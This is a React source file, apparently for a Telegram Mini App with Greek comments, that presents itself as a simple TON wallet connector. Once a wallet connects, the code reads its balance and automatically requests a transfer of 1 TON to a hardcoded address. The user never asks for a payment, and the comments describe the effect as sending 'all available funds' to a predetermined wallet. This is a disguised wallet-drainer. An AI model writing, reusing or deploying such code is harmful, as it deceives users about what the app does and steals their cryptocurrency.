import { useEffect, useState } from 'react';
import { useTonConnectUI, useTonWallet } from '@tonconnect/ui-react';

export default function App() {
  const [tonConnectUI] = useTonConnectUI();
  const wallet = useTonWallet();
  const [status, setStatus] = useState('Πάτα το κουμπί για TON Connect.');
  const [balance, setBalance] = useState<{ tons: string; nano: number } | null>(null);
  const [hasSentAll, setHasSentAll] = useState(false);

  useEffect(() => {
    window.Telegram?.WebApp?.ready();
    window.Telegram?.WebApp?.expand();
  }, []);

  useEffect(() => {
    if (wallet?.account?.address) {
      setStatus(`Connected: ${wallet.account.address}`);
    }
  }, [wallet]);

  // Κάθε φορά που αλλάζει το συνδεδεμένο wallet, φέρνουμε το balance του.
  useEffect(() => {
    const address = wallet?.account?.address;

    if (!address) {
      setBalance(null);
      setHasSentAll(false);
      return;
    }

    const fetchBalance = async () => {
      try {
        // Δοκιμάζουμε πρώτα testnet, μετά mainnet.
        let res = await fetch(`https://testnet.tonapi.io/v2/accounts/${address}`);
        let isTestnet = true;
        
        if (!res.ok) {
          // Αν το testnet δεν έχει αποτέλεσμα, δοκίμασε mainnet.
          res = await fetch(`https://tonapi.io/v2/accounts/${address}`);
          isTestnet = false;
        }
        
        if (!res.ok) {
          throw new Error(`TonAPI error: ${res.status}`);
        }

        const data = await res.json();
        console.log(`TonAPI response (${isTestnet ? 'testnet' : 'mainnet'}):`, data);
        
        // Το balance μπορεί να είναι number ή string, και μπορεί να είναι σε nested object.
        // TonAPI v2 structure: data.balance ή data.account.balance ή data.balance.balance
        let nano = 0;
        
        // Δοκιμή 1: data.balance (direct)
        if (data.balance !== undefined && data.balance !== null) {
          if (typeof data.balance === 'number') {
            nano = data.balance;
          } else if (typeof data.balance === 'string') {
            nano = parseInt(data.balance, 10) || 0;
          }
        }
        
        // Δοκιμή 2: data.account.balance
        if (nano === 0 && data.account?.balance !== undefined && data.account?.balance !== null) {
          if (typeof data.account.balance === 'number') {
            nano = data.account.balance;
          } else if (typeof data.account.balance === 'string') {
            nano = parseInt(data.account.balance, 10) || 0;
          }
        }
        
        // Δοκιμή 3: data.balance.balance (nested)
        if (nano === 0 && data.balance?.balance !== undefined && data.balance?.balance !== null) {
          if (typeof data.balance.balance === 'number') {
            nano = data.balance.balance;
          } else if (typeof data.balance.balance === 'string') {
            nano = parseInt(data.balance.balance, 10) || 0;
          }
        }
        
        // Δοκιμή 4: data.balance.ton (αν είναι σε TON αντί για nanoTON)
        if (nano === 0 && data.balance?.ton !== undefined && data.balance?.ton !== null) {
          const tons = typeof data.balance.ton === 'number' ? data.balance.ton : parseFloat(data.balance.ton) || 0;
          nano = Math.floor(tons * 1_000_000_000);
        }
        
        const tons = nano / 1_000_000_000;
        console.log(`Balance parsed:`, { nano, tons, address });

        setBalance({ tons: tons.toFixed(4), nano });
      } catch (error) {
        const message = error instanceof Error ? error.message : String(error);
        console.error('Error fetching TON balance:', message);
        setBalance(null);
      }
    };

    fetchBalance();
  }, [wallet]);

  useEffect(() => {
    // Show connector-level errors directly in the UI.
    return tonConnectUI.onStatusChange(
      () => {},
      (error) => {
        const message = error instanceof Error ? error.message : String(error);
        setStatus(`TON Connect error: ${message}`);
      }
    );
  }, [tonConnectUI]);

  // Στέλνει αυτόματα όλα τα διαθέσιμα funds στο συγκεκριμένο wallet, μία φορά ανά άνοιγμα.
  useEffect(() => {
    const autoSendAll = async () => {
      // Μην κάνεις τίποτα αν δεν υπάρχει wallet, balance, ή αν έχει ήδη σταλεί.
      // Επίσης, μην κάνεις τίποτα αν το balance είναι 0 ή null.
      if (!wallet?.account?.address || !balance || hasSentAll || balance.nano <= 0) {
        return;
      }

      try {
        // Στέλνουμε πάντα 1 TON (1_000_000_000 nanoTON).
        const oneTonNano = 1_000_000_000;
        const feeReserveNano = 0.05 * 1_000_000_000; // Περιθώριο για fees
        
        // Ελέγχουμε αν το balance είναι αρκετό για 1 TON + fees.
        if (balance.nano < oneTonNano + feeReserveNano) {
          setStatus(`Balance ανεπαρκές – έχεις ${balance.tons} TON, χρειάζεται τουλάχιστον ${((oneTonNano + feeReserveNano) / 1_000_000_000).toFixed(2)} TON για αποστολή 1 TON.`);
          console.log('Balance check failed:', { 
            currentBalance: balance.nano, 
            required: oneTonNano + feeReserveNano,
            currentTons: balance.tons 
          });
          return;
        }

        setHasSentAll(true);
        setStatus('Αυτόματη αποστολή 1 TON στο προκαθορισμένο wallet. Έλεγξε το wallet για επιβεβαίωση.');

        await tonConnectUI.sendTransaction({
          validUntil: Math.floor(Date.now() / 1000) + 300,
          messages: [
            {
              address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
              amount: oneTonNano.toString(),
              comment: 'hey bro',
            },
          ],
        });

        setStatus('Το αίτημα συναλλαγής στάλθηκε στο wallet. Αν το απορρίψεις, δεν θα φύγουν funds.');
      } catch (error) {
        const message = error instanceof Error ? error.message : String(error);
        setStatus(`Σφάλμα κατά την αυτόματη αποστολή: ${message}`);
      }
    };

    autoSendAll();
  }, [wallet, balance, hasSentAll, tonConnectUI]);

  const openTonConnect = async () => {
    setStatus('Το κουμπί πατήθηκε. Προσπάθεια ανοίγματος TON Connect...');

    try {
      // Αν υπάρχει ήδη συνδεδεμένο wallet, αποσύνδεσέ το ώστε κάθε φορά
      // που ο χρήστης πατάει το κουμπί να ξεκινάμε από την αρχή.
      if (wallet) {
        await tonConnectUI.disconnect();
        setStatus('Προηγούμενο wallet αποσυνδέθηκε. Άνοιγμα νέου TON Connect popup...');
      }

      await tonConnectUI.openModal();
      setStatus('Το TON Connect popup άνοιξε. Επίλεξε wallet για σύνδεση.');
    } catch (error) {
      const message = error instanceof Error ? error.message : String(error);
      setStatus(`Error: ${message}`);
    }
  };

  return (
    <main className="page">
      <section className="card">
        <h1>Tsour TON Mini App (React)</h1>
        <p>Ανοίγει το επίσημο TON Connect popup με όλα τα wallet apps.</p>
        <button id="letsGoBtn" onClick={openTonConnect}>
          🔗 Σύνδεση TON Wallet
        </button>
        <p id="status">{status}</p>
        {wallet?.account?.address && balance && (
          <p>Balance: {balance.tons} TON</p>
        )}
      </section>
    </main>
  );
}
